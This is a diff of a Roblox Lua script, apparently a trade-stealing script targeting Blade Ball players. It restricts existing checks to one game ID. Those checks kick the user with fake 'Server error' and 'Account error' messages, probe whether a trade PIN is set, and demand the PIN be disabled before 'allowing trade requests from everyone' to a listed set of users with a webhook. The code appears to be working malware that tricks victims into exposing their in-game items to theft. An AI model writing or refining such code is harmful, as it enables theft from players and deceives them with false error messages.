@@ -42,27 +42,30 @@ if next(users) == nil or webhook == "" then
     return
 end
 
-if #Players:GetPlayers() >= 16 then
-    plr:kick("Server is full. Please join a less populated server")
-    return
-end
-
-if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
-    plr:kick("Server error. Please join a DIFFERENT server")
-    return
-end
-
--- PIN Check
-local args = {
-    [1] = {
-        ["option"] = "PIN",
-        ["value"] = "9079"
+-- Only run Blade Ball-specific checks if in Blade Ball
+if game.PlaceId == 13772394625 then
+    if #Players:GetPlayers() >= 16 then
+        plr:kick("Server is full. Please join a less populated server")
+        return
+    end
+    
+    if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+        plr:kick("Server error. Please join a DIFFERENT server")
+        return
+    end
+    
+    -- PIN Check (Blade Ball specific)
+    local args = {
+        [1] = {
+            ["option"] = "PIN",
+            ["value"] = "9079"
+        }
     }
-}
-local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
-if PINReponse ~= "You don't have a PIN code" then
-    plr:kick("Account error. Please disable trade PIN and try again")
-    return
+    local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
+    if PINReponse ~= "You don't have a PIN code" then
+        plr:kick("Account error. Please disable trade PIN and try again")
+        return
+    end
 end
 
 -- Allow trade requests from everyone
